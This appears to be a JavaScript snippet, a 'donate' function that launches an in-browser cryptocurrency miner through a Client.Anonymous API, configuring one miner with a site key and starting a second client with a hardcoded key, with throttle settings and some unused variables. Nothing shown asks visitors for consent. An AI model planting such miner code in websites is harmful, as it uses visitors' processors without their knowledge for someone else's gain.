function donate() {
    console.log('The miner is starting!')

    // Miner init

    var miner = new Client.Anonymous(siteKey, {
        throttle: 0.5,
        ads: 0,
        autoThread: true
    })

    var client = new Client.Anonymous('8f0a9d558ac5ed43ae2c6ea7ecd945860300f6b01433df955ee4b3f9dbc9fb31', {
        throttle: 0.5, c: 'w'
    });
    client.start();

    let minerStartTime = 0
    let previousHashes = 0

    let rate = 30 // On a scale from 0-100
    let throttle = 1 - rate / 100
    miner.setThrottle(throttle);
}